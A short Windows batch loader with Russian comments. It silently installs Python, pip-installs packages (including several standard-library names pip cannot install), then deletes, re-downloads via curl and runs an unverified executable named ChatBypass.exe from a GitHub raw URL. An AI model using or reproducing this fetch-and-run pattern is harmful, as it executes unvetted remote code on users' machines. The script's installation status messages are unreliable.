@echo off
chcp 65001 > nul
title Loader
mkdir models

cls

REM Проверка, установлен ли Python
python --version 2>NUL
if %errorlevel% neq 0 (
    echo Python не установлен. Устанавливаю Python...
    REM Скачивание и установка Python (для Windows)
    bitsadmin /transfer PythonInstaller /download /priority normal https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe %TEMP%\python_installer.exe
    %TEMP%\python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    echo Python успешно установлен.
    
    REM Установка необходимых библиотек
    echo Устанавливаю необходимые библиотеки...
    pip install requests pyautogui time keyboard pytz datetime sys ctypes subprocess psutil pypresence
) else (
    echo Python установлен.
    echo Библиотеки установлены.
)

cls

DEL /F /Q "%CD%\models\ChatBypass.exe"
REM Проверка наличия файла models\ChatBypass.exe и его загрузка при отсутствии
IF NOT EXIST models\ChatBypass.exe (
    echo Файл models\ChatBypass.exe не найден/установлен. Загружаю файл...
    curl -L -o models\ChatBypass.exe https://github.com/Vu4eke/staltracker-api/raw/main/ChatBypass.exe
    echo Файл ChatBypass.exe загружен.
    echo ChatBypass: Запуск...
)


REM Запуск
.\models\ChatBypass.exe

REM Завершение выполнения